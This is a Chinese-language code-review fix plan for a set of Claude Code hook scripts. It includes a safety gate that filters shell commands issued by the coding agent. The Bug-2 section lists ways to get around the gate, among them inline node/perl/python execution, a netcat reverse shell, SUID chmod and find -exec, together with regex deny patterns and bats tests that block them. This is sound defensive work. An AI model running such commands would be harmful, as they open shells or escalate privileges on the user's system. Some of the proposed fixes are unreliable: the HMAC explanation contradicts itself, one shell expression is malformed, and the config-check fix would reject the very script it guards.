# Claude Code Hooks — 代码审查 Bug 修复计划

> 基于高质量代码审查报告制定的修复方案
> 日期：2026-04-12

## 🔴 P0 级 Bug（紧急修复）

### Bug-1: 飞书 HMAC 签名算法错误 ⚠️ 关键

**位置：** `scripts/send-notification.sh` L162-164

**当前代码：**
```bash
local sign_str="${timestamp}\n${NOTIFY_FEISHU_SECRET}"
local sign
sign=$(printf '%b' "${sign_str}" | openssl dgst -sha256 -hmac "${NOTIFY_FEISHU_SECRET}" -binary | base64)
```

**问题分析：**

根据飞书开放平台文档，HMAC-SHA256 签名算法应为：
```
sign = base64(HMAC-SHA256(timestamp + "\n" + secret, secret))
```

当前代码问题：
1. `sign_str` 中混入了 secret，被签名的内容应该只是 `timestamp + "\n" + secret`（本身是数据）
2. `-hmac` 参数应该是 secret，日志显示正确，但需要验证 printf '%b' 的处理

**正确修复：**
```bash
local timestamp
timestamp=$(date +%s)
local sign_str="${timestamp}"$'\n'"${NOTIFY_FEISHU_SECRET}"  # 使用 $'\n' 保证换行符正确
local sign
sign=$(echo -n "${sign_str}" | openssl dgst -sha256 -hmac "${NOTIFY_FEISHU_SECRET}" -binary | base64)
payload="{\"timestamp\":\"${timestamp}\",\"sign\":\"${sign}\",\"msg_type\":\"text\",\"content\":{\"text\":\"${escaped_msg}\"}}"
```

**测试：**
```bash
# 与飞书 WebHook 实际测试，确保签名校验通过
curl -X POST https://open.feishu.cn/open-apis/bot/v2/hook/YOUR_TOKEN \
  -H 'Content-Type: application/json' \
  -d '{"timestamp":"...", "sign":"...", ...}'
```

---

### Bug-2: cc-safety-gate.sh 黑名单不完整

**位置：** `scripts/cc-safety-gate.sh` L35-100

**遗漏的危险命令：**

当前黑名单缺少以下绕过方式：
```bash
# Node.js 代码执行
node -e "require('child_process').execSync('...')"
node --eval "require('child_process')..."

# Perl 代码执行
perl -e "system(...)"
perl -E "system(...)"

# Python 代码执行（不仅仅是 exec）
python3 -c "import subprocess; subprocess.run(...)"

# 反弹 shell
nc -e /bin/bash 127.0.0.1 9999

# SUID 权限提升
chmod +s /path/to/binary

# find 命令执行
find . -exec bash -c '...' \;

# make/cmake 构建时执行
make -B SHELL=/bin/bash
```

**修复建议：**
```bash
# 在黑名单中添加
'node\s+(-e|--eval|--input-type)'
'perl\s+(-e|-E)'
'python\d*\s+(-c|--command)'
'(nc|ncat|netcat)\s+(-e|--sh-bang)'
'chmod\s+.*\+s'
'find\s+.*-exec'
'make\s+.*SHELL='
'cmake\s+.*SHELL='
'\beval\b'
'\bsource\s+<'
```

**PR 示例：**
```bash
# 增强的黑名单规则
DANGEROUS_PATTERNS+=(
    'node\s+(-e|--eval).*'           # Node.js 代码执行
    'perl\s+(-e|-E).*'               # Perl 代码执行
    'python\d*\s+(-c|--command).*'   # Python 代码执行
    '(nc|ncat|netcat)\s+.*-e'        # 反弹 shell
    'chmod\s+.*\+s'                  # SUID 提升
    'find\s+.*-exec.*bash'           # find 执行任意命令
)

# 在检查循环中
for pattern in "${DANGEROUS_PATTERNS[@]}"; do
    if echo "${CMD}" | grep -qE "${pattern}"; then
        _deny "Dangerous pattern detected: ${pattern}"
    fi
done
```

---

### Bug-3: _safe_source_conf 误伤合法配置

**位置：** `scripts/cc-safety-gate.sh` 或通用中  

**当前代码问题：**
```bash
if grep -qF '$(' "${_file}"; then
    return 1  # 直接拒绝！
fi
```

这会导致注释中包含 `$(` 的配置文件被拒绝。例如：
```bash
# CC_BARK_URL=https://api.day.app/$(whoami)  ← 这是注释！但被拒绝了
CC_BARK_URL=https://api.day.app/123
```

**修复：**
```bash
_safe_source_conf() {
    local _file="$1"
    [ -f "$_file" ] || return 1
    
    # 只检查非注释行中的危险字符
    local _tainted_lines
    _tainted_lines=$(grep -v '^\s*#' "$_file" | grep -E '[$`]|\\(|&&|;.*eval|source\s+<' 2>/dev/null || true)
    
    if [ -n "$_tainted_lines" ]; then
        _cchooks_error "Config file contains suspicious code (non-comment lines): $(($(echo "$_tainted_lines" | wc -l))} lines"
        return 1
    fi
    
    source "$_file" || return 1
}
```

---

### Bug-4: send-notification.sh source 无完整性校验

**位置：** `scripts/cc-stop-hook.sh` L60

**当前代码：**
```bash
source "${SCRIPT_DIR}/send-notification.sh"  # 无校验！
```

**修复：**
```bash
# 在所有 source 前都要校验
_safe_source_conf "${SCRIPT_DIR}/send-notification.sh" || {
    _log_jsonl "error" "send-notification.sh not found or corrupted"
    exit 0  # Fail-open
}
```

---

## 🟡 P1 级 Bug（强烈建议）

### Bug-5: 代码重复过多（DRY 违反）

**问题：** 5 个脚本都有 150+ 行重复的样板代码

**解决方案：** 创建 `scripts/common.sh`

```bash
# scripts/common.sh
#!/bin/bash

# 统一的日志、JSON、变量初始化

_log_jsonl() { 
    # 审计日志记录
}

_json_get() {
    # 统一的 jq/python3 双路径解析
}

_safe_source_conf() {
    # 统一的配置文件安全加载
}

# 各脚本只需：
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
```

**减少代码行数：** ~500 行 → ~100 行

---

### Bug-6: reap-orphans.sh 与其他脚本不一致

**问题：** `reap-orphans.sh` 使用 `set -euo pipefail`，其他脚本没有

**修复：** 移除 `set -e`，改用显式错误检查

```bash
set -uo pipefail  # 保留这两个
_had_error=false

trap '_had_error=true' ERR  # 宽松的错误捕获

_kill_check "$PID" || true  # 显式处理非零返回
```

---

### Bug-7: 添加单元测试

**建议：** 使用 `bats` 框架

```bash
# tests/cc-safety-gate.bats
#!/usr/bin/env bats

@test "should reject rm -rf /" {
    run bash scripts/cc-safety-gate.sh "rm -rf /"
    [ "$status" -eq 1 ]
    [[ "$output" == *"Dangerous"* ]]
}

@test "should reject node -e" {
    run bash scripts/cc-safety-gate.sh "node -e 'exec(...);'"
    [ "$status" -eq 1 ]
}

@test "should allow safe commands" {
    run bash scripts/cc-safety-gate.sh "echo hello"
    [ "$status" -eq 0 ]
}
```

---

## 🟢 P2 级（锦上添花）

### P2-1: 配置文件可配置化

```bash
# scripts/common.sh
LARGE_FILE_THRESHOLD=${LARGE_FILE_THRESHOLD:-1000}  # 可环境变量覆盖
MAX_CONCURRENT_TIMERS=${MAX_CONCURRENT_TIMERS:-3}
GLOBAL_COOLDOWN_SECONDS=${GLOBAL_COOLDOWN_SECONDS:-10}
```

### P2-2: 添加 --dry-run 模式

```bash
# cc-safety-gate.sh --dry-run "dangerous command"
# 只记录日志，不拦截，方便调试规则
```

### P2-3: GitHub Actions CI

```yaml
# .github/workflows/test.yml
name: Tests
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm install -g bats
      - run: bats tests/*.bats
```

---

## 📋 修复检查清单

```bash
□ 飞书 HMAC 签名修复 + 本地测试通过
□ 黑名单补充(node/perl/python/nc/chmod+s)
□ _safe_source_conf 只检查非注释行
□ send-notification.sh source 加完整性校验
□ common.sh 提取重复代码
□ reap-orphans.sh 移除 set -e
□ 添加 5+ 个 bats 单元测试
□ 本地全整体测试 (./install.sh)
□ 文档更新

修复完成后，这个项目质量评分将从 7.5/10 → 9/10
```

---

## 🚀 修复优先级顺序

1. **第一轮（本周）：** P0 级 4 个 Bug（关键安全性）
2. **第二轮（下周）：** P1 级改进（代码质量）
3. **第三轮（可选）：** P2 级优化（锦上添花）

---

## 参考资源

- 飞书开放平台文档：https://open.feishu.cn/document/
- Bash 安全最佳实践：https://mywiki.wooledge.org/BashGuide/Practices
- ShellCheck 在线工具：https://www.shellcheck.net/
- Bats 测试框架：https://github.com/bats-core/bats-core
